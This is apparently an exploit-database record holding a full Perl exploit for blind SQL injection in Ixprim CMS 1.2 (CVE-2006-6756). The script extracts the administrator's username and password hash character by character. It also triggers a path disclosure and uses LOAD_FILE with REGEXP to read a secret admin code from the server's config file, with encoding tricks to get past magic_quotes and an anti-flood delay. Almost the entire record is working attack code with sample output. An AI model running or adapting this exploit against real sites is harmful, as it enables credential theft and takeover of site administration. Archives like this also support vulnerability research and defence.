{
  "id": "2975",
  "title": "Ixprim CMS 1.2 - Blind SQL Injection",
  "cve": "CVE-2006-6756",
  "vuln_type": "sqli",
  "code": "#!/usr/bin/perl\r\n#\r\n# INFORMATIONS\r\n# ============\r\n# Affected.scr..: Ixprim 1.2\r\n# Poc.ID........: 16061221\r\n# Type..........: Blind SQL Injection\r\n# Risk.level....: Medium\r\n# Conditions....: load_file privilege (ixp code only)\r\n# Src.download..: www.ixprim-cms.org\r\n# Poc.link......: acid-root.new.fr/poc/16061221.txt\r\n# Credits.......: DarkFig\r\n#\r\n#\r\n# SCREENSHOT\r\n# ==========\r\n# header> Ixprim 1.2 Remote Blind SQL Injection Exploit\r\n# header> =============================================\r\n# status> Searching if someone posted a comment\r\n# sploit> story_id=2\r\n# status> Searching the administrator's uid\r\n# sploit> 1\r\n# status> Searching the administrator's username length\r\n# sploit> 4\r\n# status> Searching the administrator's username\r\n# sploit> root\r\n# status> Searching the adminitrator's password hash\r\n# sploit> 7b24afc8bc80e548d66c4e7ff72171c5\r\n# status> Searching a full path disclosure\r\n# sploit> /home/www/ixprim-1.2/html/mainfile.php\r\n# status> Searching the confidential ixp code\r\n# sploit> c998aa6188034690aab6565c0099fe0a\r\n#\r\nuse HTTP::Request::Common;\r\nuse LWP::UserAgent;\r\nuse HTTP::Response;\r\nuse Getopt::Long;\r\n\r\nprint STDOUT \"\\n header> Ixprim 1.2 Remote Blind SQL Injection Exploit\";\r\nprint STDOUT \"\\n header> =============================================\\n\";\r\n\r\nmy $opt = GetOptions(\r\n   'host=s'  => \\$host,\r\n   'path=s'  => \\$path,\r\n   'proxh=s' => \\$proxh,\r\n   'proxu=s' => \\$proxu,\r\n   'proxp=s' => \\$proxp);\r\n\r\nif(!$host) {\r\n    print STDOUT \" header> Usage..: xpl.pl -host [host] -path [path]\\n\";\r\n    print STDOUT \" header> Options: -proxh [host] -proxu [user] -proxp [pass]\\n\";\r\n    exit(1);\r\n}\r\n\r\n$host = $host !~ /^http:\\/\\// ? \"http://$host\" : $host;\r\n$path = defined($path) ? $path : \"/\";\r\n\r\nmy $ua = LWP::UserAgent->new();\r\n   $ua->agent('r00xzilla');\r\n   $ua->timeout(30);\r\n   $ua->proxy('[http]' => $proxh) if $proxh;\r\n\r\nmy $req = HTTP::Request->new(GET => $host.$path.'ixm_ixpnews.php');\r\n   $req->proxy_authorization_basic($proxu,$proxp) if $proxu;\r\n   $res = ($ua->request($req))->content;\r\n   print STDOUT \" status> Searching if someone posted a comment\\n\";\r\n\r\n   # There is more than one sql injection, but this one is the most\r\n   # interesting to exploit. The parameter 'story_id' isn't properly\r\n   # sanitised before being used in an SQL query. URL Rewriting option\r\n   # supported.\r\n   #\r\n   if($res =~ /(story_id=||news-art)([0-9]+)(||.html)\">([0-9]+) (commentaire||comment)/) {\r\n   $story_id = $2;\r\n   $bsql = $host.$path.\"ixm_ixpnews.php?file=article&story_id=$story_id\";\r\n   print STDOUT \" sploit> story_id=$story_id\\n\";} else {\r\n   print STDOUT \" status> No comment posted\\n\\n\";\r\n   exit(1);\r\n   }\r\n   \r\n   print STDOUT \" status> Searching the administrator's uid\\n\";\r\n   $uid = sendreq(1,1,\"select%20uid%20from%20ixp_users%20order%20by%20uid%20limit%200,1\");\r\n   \r\n   print STDOUT \" status> Searching the administrator's username length\\n\";\r\n   $admlg = sendreq(1,3,\"length((select%20uname%20from%20ixp_users%20where%20uid=$uid))\");\r\n\r\n   print STDOUT \" status> Searching the administrator's username\\n\";\r\n   &sendreq(1,$admlg,\"select%20uname%20from%20ixp_users%20where%20uid=$uid\");\r\n   \r\n   print STDOUT \" status> Searching the adminitrator's password hash\\n\";\r\n   &sendreq(1,32,\"select%20pass%20from%20ixp_users%20where%20uid=$uid\");\r\n   \r\n   print STDOUT \" status> Searching a full path disclosure\";\r\n   $req = GET $host.$path.'kernel/plugins/fckeditor2/ixprim_api.php';\r\n   $res = ($ua->request($req))->content;\r\n   if($res =~ /in <b>(.*?)kernel(\\/||\\\\)/) {\r\n   $fpd = $1.'mainfile.php';\r\n   print STDOUT \"\\n sploit> $fpd\\n\";} else {\r\n   print STDOUT \"\\n status> Can't get the full path disclosure\";\r\n   exit(1);\r\n   }\r\n\r\n   # A personal code who is stored in mainfile.php protect the administration panel\r\n   #\r\n   # // Code personnel CMS\r\n   #\tdefine(\"IXP_CODE\", 'c998aa6188034690aab6565c0099fe0a');\r\n   #\r\n   # This code is generated by the function code() stored in install.fct.php\r\n   #\r\n   # function code($param='1')\r\n   # {\r\n   # \t$number = rand(1,1024);\r\n   # \t$temp = md5(($number*time()).$param);\r\n   # \t$temp = substr($temp, 0, 8);\r\n   # \treturn $temp;\r\n   # }\r\n   #\r\n   # $param = $host.$path and $temp can be modified by the user.\r\n   # After the request sent, the script create the sql tables and the time()\r\n   # when it created them is stored in the mysql database, we can retrieve it with the sql\r\n   # injection and IF the user don't modified the generated code, we can find the personal code.\r\n   # The time during the creation of the table and the generation of the code\r\n   # is not the same, but we can try to bruteforce it with some parameters.\r\n   # But the user can change the generated code ... that's why i decided to use the sql\r\n   # injection with load_file and regexp.\r\n   #\r\n   print STDOUT \" status> Searching the confidential ixp code\\n\";\r\n   \r\n   # Example with \"C:/Program Files/EasyPHP1-8/www/ixprim-1.2/html/mainfile.php\"\r\n   #\r\n   # magic_quotes_gpc=off\r\n   # ====================\r\n   # [SQL] and LOAD_FILE(\"C:/Program Files/EasyPHP1-8/www/ixprim-1.2/html/mainfile.php\")\r\n   # REGEXP(\"define(\\\"IXP_CODE\\\", '[PART_OF_IXP_CODE]\");\r\n   #\r\n   # magic_quotes_gpc=on\r\n   # ===================\r\n   # [SQL] and LOAD_FILE(concat(char(67),char(58),char(47),char(80),char(114),char(111),char(103),char(114),\r\n   # char(97),char(109),char(32),char(70),char(105),char(108),char(101),char(115),char(47),char(69),\r\n   # char(97),char(115),char(121),char(80),char(72),char(80),char(49),char(45),char(56),char(47),char(119),\r\n   # char(119),char(119),char(47),char(105),char(120),char(112),char(114),char(105),char(109),char(45),\r\n   # char(49),char(46),char(50),char(47),char(104),char(116),char(109),char(108),char(47),char(109),char(97),\r\n   # char(105),char(110),char(102),char(105),char(108),char(101),char(46),char(112),char(104),char(112)))\r\n   # REGEXP(concat(char(73),char(88),char(80),char(95),char(67),char(79),char(68),char(69),char(34),char(44),\r\n   # char(32),char(39),char([PART_OF_IXP_CODE])))\r\n   #\r\n   &sendreq(1,32,\"load_file(concat(\".concatchar($fpd).\")) REGEXP(concat(\".concatchar(\"IXP_CODE\\\", '\"));\r\n   exit(1);\r\n\r\n   # Determine if the sql request return true or false.\r\n   # Modify the username's charset if it contain special char.\r\n   # sleep(2) needed for bypass the antiflood protection.\r\n   # If the username's length > 19 the exploit doesn't works.\r\n   #\r\nsub sendreq() {\r\n \r\n   my($start,$limit,$sql) = ($_[0],$_[1],$_[2]);\r\n   my($gchar,$char) = '';\r\n\r\n   @charset=(0...9) if $sql =~ /^(length|select%20uid)/;\r\n   @charset=(a...z,0...9) if $sql =~ /^select%20uname/;\r\n   @charset=(a...f,0...9) if $sql =~ /^(select%20pass|load_file)/;\r\n\r\n   for($y=$start;$y<=$limit;$y++) {\r\n   foreach $char (@charset) {\r\n   print STDERR \"\\r sploit> $gchar$char\";\r\n   if($sql !~ /load_file/) {\r\n   $req = GET $bsql.\"%20and%20substr((\".$sql.\"),$y,1)=\".concatchar($char);}\r\n   else {\r\n   $req = GET $bsql.\"%20and%20\".$sql.\",\".concatchar($gchar.$char).\"))\";}\r\n   sleep(2);\r\n   \r\n   $res = ($ua->request($req))->content;\r\n   if($res =~ /<br \\/> <div id=\"comments\">/) {\r\n   $gchar .= $char;\r\n   last;}}\r\n   \r\n   if(($sql =~ /length/) and ($gchar.$char =~ /^([0-9]+)9$/)){\r\n   last;}}\r\n   \r\n   print STDERR \"\\n\";\r\n return $gchar.$char;\r\n}\r\n\r\nsub concatchar() {\r\n\r\n   my $string = shift;\r\n   my $temp = '';\r\n   \r\n   for($i=0;$i<length($string);$i++) {\r\n   $temp .= \"char(\".ord(substr($string,$i,1)).\")\";\r\n   $temp .= ',' if $i != (length($string)-1);\r\n   }\r\n   \r\n return $temp;\r\n}\r\n\r\n# milw0rm.com [2006-12-21]",
  "url": "https://www.exploit-db.com/exploits/2975"
}